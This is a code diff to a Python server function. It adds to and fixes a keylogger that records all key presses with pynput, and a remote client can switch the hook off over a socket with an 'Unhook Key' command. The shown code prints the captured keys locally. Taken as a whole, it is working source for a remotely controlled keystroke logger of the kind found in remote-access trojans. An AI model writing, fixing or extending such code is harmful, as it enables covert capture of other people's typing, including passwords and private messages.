@@ -75,30 +75,35 @@ def Server_Running():
         import threading
         import pynput
         import time
-        from pynput.keyboard import Key, Listener
+        from pynput.keyboard import Key, Listener, Controller
+
+        keyboard = Controller()
         keys = []
         KeyStop = True
         def Stop():
-            while True:
-                nonlocal KeyStop
-                check = client.recv(1024).decode("utf8")
-                print(check)
-                if check == "Unhook Key": 
-                    client.sendall(bytes("OK","utf8"))
-                    KeyStop = False
-                    break
+            try:
+                while True:
+                    nonlocal KeyStop
+                    check = client.recv(1024).decode("utf8")
+                    print(check)
+                    if check == "Unhook Key":
+                        client.sendall(bytes("OK","utf8"))
+                        KeyStop = False
+                        break
+            finally:
+                keyboard.release(Key.space)
         t1 = threading.Thread(target=Stop)
         def KeyLogger():
             def on_press(key):
-                print(KeyStop)
-                if KeyStop == False: listener.stop()
                 nonlocal keys
                 keys.append(key)
-
-            with Listener(on_press = on_press) as listener:
+            def on_release(key):
+                if KeyStop == False: listener.stop()
+            with Listener(on_release = on_release, on_press = on_press) as listener:
+                t1.join()
                 listener.join()
             for i in keys:
-                print(i)
+                print(str(i))
         t2 = threading.Thread(target=KeyLogger)
         t1.start()
         t2.start()
